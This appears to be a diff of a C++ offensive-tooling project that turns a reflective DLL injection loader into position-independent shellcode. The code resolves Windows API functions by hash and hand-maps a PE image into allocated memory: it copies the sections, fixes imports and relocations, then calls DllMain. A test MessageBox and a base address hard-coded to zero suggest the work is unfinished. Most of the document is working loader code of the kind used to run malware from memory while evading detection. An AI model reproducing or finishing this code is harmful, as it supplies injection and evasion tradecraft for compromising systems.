@@ -1,8 +1,30 @@
-#include "rfl.hpp"
-
-HINSTANCE hAppInstance = nullptr;
+#include "entry.hpp"
 
 using DLLEntry = BOOL(WINAPI *)(HINSTANCE dll, DWORD reason, LPVOID reserved);
+
+// For 64 bit shellcodes we will set this as the entrypoint
+// void AlignRSP()
+// {
+//     // AT&T syntax
+//     // asm("push %rsi\n"
+//     //     "mov % rsp, % rsi\n"
+//     //     "and $0x0FFFFFFFFFFFFFFF0, % rsp\n"
+//     //     "sub $0x020, % rsp\n"
+//     //     "call Entry\n"
+//     //     "mov % rsi, % rsp\n"
+//     //     "pop % rsi\n"
+//     //     "ret\n");
+
+//     // Intel syntax
+//     asm("push rsi\n"
+//         "mov rsi, rsp\n"
+//         "and rsp, 0x0FFFFFFFFFFFFFFF0\n"
+//         "sub rsp, 0x020\n"
+//         "call Entry\n"
+//         "mov rsp, rsi\n"
+//         "pop rsi\n"
+//         "ret\n");
+// }
 
 VOID ResolveIAT(
 	LPVOID lpVirtualAddr,
@@ -94,11 +116,11 @@ VOID ReallocateSections(
 	}
 }
 
-// This function is invoked by DLL Loader with Reflective DLL Injection technique.
-DLLEXPORT BOOL ReflectiveLoader(LPVOID lpParameter)
+SEC(text, B) VOID Entry()
 {
-	// Get this base address.
-	LPVOID lpRflLdr = ReflectiveCaller();
+    // Get this base address.
+	// LPVOID lpBaseAddr = ReflectiveCaller();
+	ULONG_PTR uBaseAddr = 0x00;
 
 	Nt::PPEB pPeb = (Nt::PPEB)PPEB_PTR;
 
@@ -109,26 +131,42 @@ DLLEXPORT BOOL ReflectiveLoader(LPVOID lpParameter)
 	HMODULE hNtdll = (HMODULE)Modules::GetModuleByHash(HASH_MODULE_NTDLL);
 	if (!hNtdll)
 	{
-		return FALSE;
+		return;
 	}
 	HMODULE hKernel32 = (HMODULE)Modules::GetModuleByHash(HASH_MODULE_KERNEL32);
 	if (!hKernel32)
 	{
-		return FALSE;
+		return;
 	}
 
-	Procs::LPPROC_LOADLIBRARYA lpLoadLibraryA = reinterpret_cast<Procs::LPPROC_LOADLIBRARYA>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_LOADLIBRARYA));
-	Procs::LPPROC_GETPROCADDRESS lpGetProcAddress = reinterpret_cast<Procs::LPPROC_GETPROCADDRESS>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_GETPROCADDRESS));
-	Procs::LPPROC_VIRTUALALLOC lpVirtualAlloc = reinterpret_cast<Procs::LPPROC_VIRTUALALLOC>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_VIRTUALALLOC));
-	Procs::LPPROC_VIRTUALPROTECT lpVirtualProtect = reinterpret_cast<Procs::LPPROC_VIRTUALPROTECT>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_VIRTUALPROTECT));
+    // Get functions
+    Procs::LPPROC_LDRLOADDLL lpLdrLoadDll = reinterpret_cast<Procs::LPPROC_LDRLOADDLL>(Procs::GetProcAddressByHash(hNtdll, HASH_FUNC_LDRLOADDLL));
 	Procs::LPPROC_NTFLUSHINSTRUCTIONCACHE lpNtFlushInstructionCache = reinterpret_cast<Procs::LPPROC_NTFLUSHINSTRUCTIONCACHE>(Procs::GetProcAddressByHash(hNtdll, HASH_FUNC_NTFLUSHINSTRUCTIONCACHE));
+    
+    Procs::LPPROC_GETPROCADDRESS lpGetProcAddress = reinterpret_cast<Procs::LPPROC_GETPROCADDRESS>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_GETPROCADDRESS));
+    Procs::LPPROC_LOADLIBRARYA lpLoadLibraryA = reinterpret_cast<Procs::LPPROC_LOADLIBRARYA>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_LOADLIBRARYA));
+    Procs::LPPROC_LOADLIBRARYW lpLoadLibraryW = reinterpret_cast<Procs::LPPROC_LOADLIBRARYW>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_LOADLIBRARYW));
+    Procs::LPPROC_VIRTUALALLOC lpVirtualAlloc = reinterpret_cast<Procs::LPPROC_VIRTUALALLOC>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_VIRTUALALLOC));
+	Procs::LPPROC_VIRTUALPROTECT lpVirtualProtect = reinterpret_cast<Procs::LPPROC_VIRTUALPROTECT>(Procs::GetProcAddressByHash(hKernel32, HASH_FUNC_VIRTUALPROTECT));
 
+    // -----------------------------------------------------------------------------
+	// Get other modules and functions
+	// -----------------------------------------------------------------------------
+
+    WCHAR wUser32[] = L"user32.dll";
+    HMODULE hUser32 = (HMODULE)Modules::LoadModule(lpLdrLoadDll, (LPWSTR)wUser32);
+
+    // Get functions
+	Procs::LPPROC_MESSAGEBOXA lpMessageBoxA = reinterpret_cast<Procs::LPPROC_MESSAGEBOXA>(Procs::GetProcAddressByHash(hUser32, HASH_FUNC_MESSAGEBOXA));
+	
+	lpMessageBoxA(NULL, "This is 'dll-loader'.", "Test", MB_OK);
+	
 	// -----------------------------------------------------------------------------
 	// Allocate virtual memory
 	// -----------------------------------------------------------------------------
 	
-	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)lpRflLdr + ((PIMAGE_DOS_HEADER)lpRflLdr)->e_lfanew);
-
+	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uBaseAddr + ((PIMAGE_DOS_HEADER)uBaseAddr)->e_lfanew);
+	
 	LPVOID lpVirtualAddr = lpVirtualAlloc(
         NULL,
         pNtHeaders->OptionalHeader.SizeOfImage,
@@ -137,7 +175,7 @@ DLLEXPORT BOOL ReflectiveLoader(LPVOID lpParameter)
     );
 	if (!lpVirtualAddr)
 	{
-		return FALSE;
+		return;
 	}
 
 	PIMAGE_SECTION_HEADER pSecHeader = IMAGE_FIRST_SECTION(pNtHeaders);
@@ -146,7 +184,7 @@ DLLEXPORT BOOL ReflectiveLoader(LPVOID lpParameter)
 	{
 		MEMCPY(
 			(LPVOID)(lpVirtualAddr + pSecHeader[i].VirtualAddress),
-			(LPVOID)(lpRflLdr + pSecHeader[i].PointerToRawData),
+			(LPVOID)(uBaseAddr + pSecHeader[i].PointerToRawData),
 			pSecHeader[i].SizeOfRawData
 		);
 	}
@@ -158,7 +196,7 @@ DLLEXPORT BOOL ReflectiveLoader(LPVOID lpParameter)
 	PIMAGE_DATA_DIRECTORY pImageDir =  (PIMAGE_DATA_DIRECTORY)&pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];	
 	if (!pImageDir->VirtualAddress)
 	{
-		return FALSE;
+		return;
 	}
 	ResolveIAT(
 		lpVirtualAddr,
@@ -174,7 +212,7 @@ DLLEXPORT BOOL ReflectiveLoader(LPVOID lpParameter)
 	pImageDir = (PIMAGE_DATA_DIRECTORY)&pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
 	if (!pImageDir)
 	{
-		return FALSE;
+		return;
 	}
 	ReallocateSections(
 		lpVirtualAddr,
@@ -237,12 +275,10 @@ DLLEXPORT BOOL ReflectiveLoader(LPVOID lpParameter)
 	}
 
 	// -----------------------------------------------------------------------------
-    // Execute DLL
+    // Execute Shellcode
 	// -----------------------------------------------------------------------------
 
 	Procs::LPPROC_DLLMAIN lpDllMain = reinterpret_cast<Procs::LPPROC_DLLMAIN>((ULONG_PTR)lpVirtualAddr + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
 	lpNtFlushInstructionCache((HANDLE)-1, NULL, 0);
     lpDllMain((HINSTANCE)lpVirtualAddr, DLL_PROCESS_ATTACH, NULL);
-
-    return TRUE;
 }
